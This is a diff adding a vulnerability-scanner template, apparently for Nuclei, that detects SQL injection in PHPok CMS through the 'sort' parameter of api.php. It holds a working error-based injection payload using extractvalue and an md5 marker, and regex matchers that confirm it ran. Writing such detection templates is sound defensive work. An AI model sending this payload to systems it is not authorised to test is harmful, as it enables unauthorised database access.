@@ -1,0 +1,26 @@
+id: phpok-cms-sql-injection
+
+info:
+  name: PHPok CMS SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    This template detects SQL injection vulnerability in PHPok CMS via the api.php endpoint with a crafted `sort` parameter.
+
+variables:
+  r1: "{{rand_int(800000000, 1000000000)}}"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api.php?c=project&f=index&token=1234&id=news&sort=1 and extractvalue(1,concat(0x7e,md5({{r1}}))) --+"
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "~[a-f0-9]{32}"
+        part: body
+      - type: dsl
+        dsl:
+          - "contains(body, substr(md5(r1), 0, 31))"
